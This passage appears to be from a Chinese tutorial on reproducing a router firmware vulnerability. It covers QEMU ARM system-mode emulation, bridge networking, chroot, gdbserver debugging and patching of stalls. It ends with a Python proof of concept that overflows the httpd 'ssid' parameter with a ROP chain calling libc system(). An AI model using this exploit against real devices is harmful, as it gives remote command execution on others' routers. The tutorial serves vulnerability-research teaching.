3,利用上述的bp方式改包发送数据：
最终程序终止到了此处：
4,此处我们可以看看Libc基址情况：
    方法一：
    sudo netstat -tunpl|grep 80 #查看进程PID
    sudo cat /proc/12422/maps   #查看libc情况
    方法二：gdb的vmmap功能
下断点在0xf65da50c处查看信息：
同时可以发现读取了br0网卡信息。
`对比不同方式（gdb加载进程的顺序不同）加载libc的基址：`
而且gdb一加载进程就提示了libc问题
# qemu 系统模式下测试+调试
1，同样先配通网卡(不熟悉的同学一定要去看上面那篇分享的文章搞明白哦)
    #我的宿主机的上网的网卡为ens33，并且存在多个虚拟网卡
    ifconfig ens33 down    # 首先关闭宿主机网卡接口
    brctl addbr br0                     # 添加一座名为 br0 的网桥
    brctl addif br0 ens33        # 在 br0 中添加一个接口
    brctl stp br0 on            #打开生成树协议
    brctl setfd br0 2                  # 设置 br0 的转发延迟
    brctl sethello br0 1                # 设置 br0 的 hello 时间
    ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口
    ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口
    dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址
    brctl show br0                      # 查看虚拟网桥列表
    brctl showstp br0                   # 查看 br0 的各接口信息
    tunctl -t tap0             # 创建一个 tap0 接口
    brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口
    ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口
    ifconfig tap0 192.168.198.100/24 up        #为tap0分配ip地址
    brctl showstp br0                   # 显示 br0 的各个接口
此时查看br0网桥各接口的信息如图，其中tap0的状态应该为disable，等qemu-system-mips启动后就会变为forwarding转发模式。  
2，下载qemu-system需要的kernel和虚拟硬盘文件
    wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpresswget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress
3,启动
    sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \-append "root=/dev/mmcblk0p2 console=ttyAMA0" \-net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
`script` 和 `downscript` 两个选项的作用是告诉 QEMU 在启动系统的时候是否调用脚本自动配置网络环境，如果这两个选项为空，那么
QEMU 启动和退出时会自动选择第一个不存在的 tap 接口(通常是 tap0)为参数，调用脚本 /etc/qemu-ifup 和 /etc/qemu-ifdown。由于我们已经配置完毕，所以这两个参数设置为 no 即可。
3,启动之后，eth0网卡没有分配ip地址,自己手动配个同段互通ip即可，为了等会scp输送固件文件系统到qemu虚拟机中。
    ifconfig eth0 192.168.40.100   #qemu中执行
    scp -r ./squashfs-root  PI:EMAIL:/root/ #宿主机执行
## 挂载对应目录
4,qemu虚拟机挂载固件文件系统中相应目录:
目的是使程序能读取到自身lib中的libc文件
    mount -o bind /dev ./root/devmount -t proc /proc ./root/procchroot ./ sh    #这里匹配自己对应的目录，失败就切换目录多试试
## 配置桥接网卡
5,配置br0虚拟网卡（前面已经分析过，httpd程序启动会去读取这个网卡）
    brctl addbr br0    #添加br0虚拟网卡ifconfig br0 192.168.40.200/24 up
`Tip:`
    退出qemu  :   ctrl+a同时按完释放，再x退出
6,启动程序：
正常启动：
    ./bin/httpd
调试启动：
    ./gdbserver-7.7.1-armhf-eabi5-v1-sysv 0.0.0.0:1234 ./bin/httpd
调试启动需要对应架构的gdbserver，大家可自行百度找找。[找不到的同学看这里，我又帮你找好了哦]
提示缺少权限：chmod 777附加
7，同样gdb连上
8，执行脚本方法测试（脚本POC内容在最下方，对比上面通过手工测试的方法的优劣）
这里程序又卡在了此处，流程没有正常执行下去。方法跟上面一样，通过str去定位执行指令处，分析，只要不影响程序后面正常执行的，直接patch掉即可。
通过`追踪栈帧`找到卡住的函数位置：
又是同样的问题，追踪栈帧，找到需要patch的位置：
执行成功：
# poc
system = libc_base + 0x5A270 #readelf -s ./lib/libc.so.0 | grep system  
readable_addr = libc_base + 0x64144  
mov_r0_ret_r3 = libc_base + 0x40cb8 #ROPgadget --binary ./lib/libc.so.0 --only
"pop"| grep r3  
pop_r3 = libc_base + 0x18298 #ROPgadget --binary ./lib/libc.so.0 | grep "mov
r0, sp"
payload = 'a' _(0x60) + p32(readable_addr) + 'b'_ (0x20-8)  
payload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd
url = ""  
cookie = {"Cookie":"password=12345"}  
data = {"ssid": payload}  
response = requests.post(url, cookies=cookie, data=data)  
response = requests.post(url, cookies=cookie, data=data)
#此处两次传递requests具体原因有待分析，经过实际测试对比效果确实不同，这里就留给大家交流了。  
print(response.text)
# 附
自行环境搭建
[1]
现成环境实验
[2]
docker运行环境搭建
[3]